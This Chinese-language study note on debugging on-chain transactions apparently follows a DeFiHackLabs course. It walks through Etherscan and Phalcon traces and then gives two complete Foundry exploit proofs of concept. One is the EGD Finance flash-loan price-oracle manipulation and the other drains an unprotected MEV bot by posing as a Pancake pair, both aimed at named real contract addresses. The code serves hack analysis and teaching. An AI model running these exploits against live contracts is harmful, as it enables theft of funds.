On Chain Transaction Debugging

# 1. Warm Up

以`Etherscan`的上实时的交易`0x653a4d3d34f51d3e094da1dce87a084b6e4865abd882963eda04b5da42de7ed8`为例。

这是一个`approve`合约，EtherScan上地址如下:

https://etherscan.io/tx/0x653a4d3d34f51d3e094da1dce87a084b6e4865abd882963eda04b5da42de7ed8

能看到 `OverView`中的`Value,Gas,Burnt`等信息，还能在`Logs`里看到事件的发送,`State`里地址的信息（`Balance`）也在发生变化（矿工和调用者等）。

我们在`phalcon`里搜索，在`Invocation Flow`里，可以看到整个调用流程。可以看到`Sender`、`Call`、`Event`等信息的串联。

再看看`Uniswap`，采用同一个区块交易`0x1cd5ceda7e2b2d8c66f8c5657f27ef6f35f9e557c8d1532aa88665a37130da84`来查看。

Etherscan上指出`Transaction Action:Swap 12,716.454883 USDT For 7,118.742245582778486733 UNDEAD On Uniswap V2`。并通过`Internal Txns`获取合约间的跨合约调用。

但如果用`phalcon`来看，就很优秀，一方面在`Fund Flow`中看到`ERC20`通证的流动，在`Balance Changes`里可以看到各个地址通证的变化情况。

在`Invocation Flow`里，我们不仅可以完整看到调用，还可以进入DebgLine获取结果和反馈，`JSON`部分可以看到函数调用的结果。同时可以通过`Step In/Out`查看函数调用的过程。

同时用一个`DeFi`的例子，`txn`为`0x667cb82d993657f2779507a0262c9ed9098f5a387e8ec754b99f6e1d61d92d0b`。用`phalcon`能很清晰地看出用户添加了USDT的流动性，并铸造了CRV。但这个时候`DebugLine`功能失效了，因为没有开源。

同时查看一个`Compound`的例子，在`Etherscan`上看应该是`Vote`的`Governance`行为。同样`phalcon`能更好地现实内部发生的行为，很有用处。

<hr />

在`DefiHackLab`里进行测试，同时也熟悉一下操作。

```
forge test --contracts ./src/test/Uniswapv2.sol -vvvv
```

发现会很详细的列出具体信息，包括`Gas`、`delegateCall`等信息。

# 2. Price Oracle Manipulation POC

预言机本质上是人为（或机器）实现数据的上链，并通过主动或被动进行喂价。合约还可以通过计算代币储备量之币进行计算。

整理资讯：

1. Transaction ID 交易哈希
2. Attacker Address(EOA) 攻击地址（外部）
3. Attack Contract Address 攻击合约地址
4. Vulnerable Address 漏洞合约地址
5. Total Loss 总损失
6. Reference Links 相关参考链接
7. Post-mortem Links 后期评估报告链接
8. Vulnerable snippet 相关代码片段
9. Audit History 审计历史

建议模板如下：

```solidity

 

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Script.sol";

// @KeyInfo - Total Lost : ~999M US$
// Attacker : 0xcafebabe
// Attack Contract : 0xdeadbeef
// Vulnerable Contract : 0xdeadbeef
// Attack Tx : 0x123456789

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xdeadbeef#code

// @Analysis
// Post-mortem : https://www.google.com/
// Twitter Guy : https://www.google.com/
// Hacking God : https://www.google.com/


contract ExploitScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        
        vm.stopBroadcast();
    }
}
```

采用`EGD Finance`为例，其哈希为`0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3`，发生在`BSC`链上。

分析流向

- 攻击者只调用了一笔 `harvest`
- 连续两个闪电贷，通过利用`calacuteEDGprice`喂价的问题，

所以POC合约如下：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~36K US$
// Event : EGD-Finance Hack
// Analysis via https://explorer.phalcon.xyz/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (EGD Staking Proxy Contract)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (EDG Staking Logic Contract)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// FlashLoan Lending Pool USDT_WBNB : 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE
// FlashLoan Lending Pool EGD_USDT : 0xa361433E409Adac1f87CDF133127585F8a93c67d
// Swap Pancake Router : 0x10ED43C718714eb63d5aA57B78B54704E256024E

// @Analysis
// DefiHackLab : https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc/

IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant USDT_ADDRESS = 0x55d398326f99059fF775485246999027B3197955;
address constant EGD_ADDRESS = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract EGDFinanceAttacker is Test { // EOA Simulation

    function setUp() public {
        vm.createSelectFork("bsc",20245522); // Go back to staking time
        
    }

    function testExploit() public {
        Exploit exploit = new Exploit(); 
        console.log("---  Set-up, stake 100 USDT to EGD Finance ---");
        exploit.stake();
        vm.warp(1659914146); // set timestamp for staking reward
        console.log("---  Staking finished ------------------------");

        console.log("---  Starting hacking ------------------------");
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(USDT_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);

        exploit.harvest();

        console.log("--- Hacking finished  -----------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(USDT_ADDRESS).balanceOf(address(this)), 18);
    }
}

contract Exploit is Test { // Attack Contract
    uint borrowUSDT;
    uint borrowUSDT2;

    function stake() public {
        deal(address(USDT_ADDRESS),address(this),100 ether); // set balance of address of (ERC20) to amount
        IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
        IERC20(USDT_ADDRESS).approve(EGD_Finance,100 ether);
        IEGD_Finance(EGD_Finance).stake(100 ether);
    }

    function harvest() public {
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve"); // Description
        borrowUSDT = 2000 ether;
        USDT_WBNB_LPPool.swap(borrowUSDT,0,address(this),"0000");
        console.log("Flashloan[1] : FlashLoan Payable success");
        IERC20(USDT_ADDRESS).transfer(msg.sender,IERC20(USDT_ADDRESS).balanceOf(address(this)));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        bool isBorrowUSDT = (keccak256(data) == keccak256("0000"));
        if (isBorrowUSDT){
            console.log("Receiving callback for FlashLoad[1]");
            borrowUSDT2 = IERC20(USDT_ADDRESS).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000; //  99.99999925% USDT of EGD_USDT_LPPool reserve To manipulate price
            EGD_USDT_LPPool.swap(0,borrowUSDT2,address(this),"00");
            console.log("FlashLoad[2] payable success");

            console.log("Sweep USDT in pair");
            address[] memory paths = new address[](2);
            paths[0] = EGD_ADDRESS;
            paths[1] = USDT_ADDRESS;
            IERC20(EGD_ADDRESS).approve(address(pancakeRouter),type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(EGD_ADDRESS).balanceOf(address(this)),1,paths,address(this),block.timestamp *2
            );

            IERC20(USDT_ADDRESS).transfer(msg.sender,2010 ether);
        }else{
            console.log("Receiving callback for FlashLoad[2]");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(this)), 18);
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[End] Attacker EGD Balance", IERC20(EGD_ADDRESS).balanceOf(address(this)), 18);
            uint256 swapfee = borrowUSDT2 * 3 / 1000; // Attacker pay 0.3% fee to Pancakeswap
            IERC20(USDT_ADDRESS).transfer(address(EGD_USDT_LPPool), borrowUSDT2 + swapfee);
        }
    }
}

/* -------------------- Interface -------------------- */
interface IEGD_Finance { // Interface needed to interact
    function bond(address invitor) external;
    function stake(uint256 amount) external;
    function calculateAll(address addr) external view returns (uint256);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint256);
}
```

<hr />

# 3. MEV Bot POC

总结一下，就是`MEV BOT`的余额太多，同时没有对`Pair`的身份进行校验。

反编译之后，有

```solidity
function pancakeCall(address varg0, uint256 varg1, uint256 varg2, bytes varg3) public nonPayable { 
    require(msg.data.length - 4 >= 128);
    require(varg0 == varg0);
    require(varg3 <= 0xffffffffffffffff);
    require(4 + varg3 + 31 < msg.data.length);
    require(varg3.length <= 0xffffffffffffffff);
    require(4 + varg3 + varg3.length + 32 <= msg.data.length);
    v0 = new bytes[](varg3.length);
    CALLDATACOPY(v0.data, varg3.data, varg3.length);
    v0[varg3.length] = 0;
    0x10a(v0, varg2, varg1);
}
```

有`varg0 = sender`，也就是发送者, `varg1=amount0`即`pair`中的`token0`，还有`varg2=amount1`即`pair`中的`token1`。（我们在这里只用设置`token0`），因为我们将伪装成`pair`。后面会有`0x10a(v0=varg3,varg2,varg1)`

再看`0x10a`函数：

先根据`amount0`和`amount1`选择`token0`还是`token1`（这里只用`token0`）

`    v5, v6 = address(v3).transfer(address(MEM[varg0.data]), varg1).gas(msg.gas);`此时后还会访问`MEM[varg0.data]`的`swap`函数以及`token1`函数。因为没有具体代码，很难再继续往下推进分析了。

写了一个`POC`示例，但还有很多不足，比如模拟的`EOA`账户不应该直接接受，应该由`Exploit`模拟后转账，但无伤大雅。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~140K US$
// Event : MEV BOT (BNB48)
// Analysis via https://explorer.phalcon.xyz/tx/bsc/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2
// Attacker : 0xee286554f8b315f0560a15b6f085ddad616d0601
// Attack Contract : 0x5cb11ce550a2e6c24ebfc8df86c5757b596e69c1
// Vulnerable Contract : 0x64dd59d6c7f09dc05b472ce5cb961b6e10106e1d (MEV BOT)
// Attack Tx : https://bscscan.com/tx/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2

// @Info
// Involve USDT, WBNB, BUSD, USDC for MEV_BOT

// @Analysis
// DefiHackLab : https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/04_write_your_own_poc/

address constant USDT_ADDRESS = 0x55d398326f99059fF775485246999027B3197955;
address constant WBNB_ADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant BUSD_ADDRESS = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
address constant USDC_ADDRESS = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;

address constant TARGET_MEV = 0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d;

contract MEVBOTAttacker is Test { // EOA Simulation

    function setUp() public {
        vm.createSelectFork("bsc",21297409); // Go back to staking time
    }

    function testExploit() public {
        Exploit exploit = new Exploit();
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(USDT_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker WBNB Balance", IERC20(WBNB_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker BUSD Balance", IERC20(BUSD_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 18);
        console.log("starting exploiting ...");

        exploit.attack();

        console.log("Ending exploiting ...");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(USDT_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker WBNB Balance", IERC20(WBNB_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker BUSD Balance", IERC20(BUSD_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 18);

    }

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) public {}

}

contract Exploit is Test { // Attack Contract

    address private owner;
    address public token0;
    // address public token1;

    constructor() {
        owner = msg.sender;
        console.log("Exploit Created by %s", owner);
    }

    function attack() public {
        token0 =  USDT_ADDRESS;
        subAttack();
        token0 =  WBNB_ADDRESS;
        subAttack();
        token0 =  BUSD_ADDRESS;
        subAttack();
        token0 =  USDC_ADDRESS;
        subAttack();
    }

    function subAttack() private {
        IBOT(TARGET_MEV).pancakeCall(
            address(this), 
            IERC20(token0).balanceOf(TARGET_MEV),
            0, 
            abi.encodePacked(
                bytes12(0), bytes20(address(owner)), // slot
                bytes32(0), 
                bytes32(0))
        );
    }

    function token1() public returns(address){
        return token0;
    }


}

// interface of MEV
interface IBOT {
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
}
```

<hr />

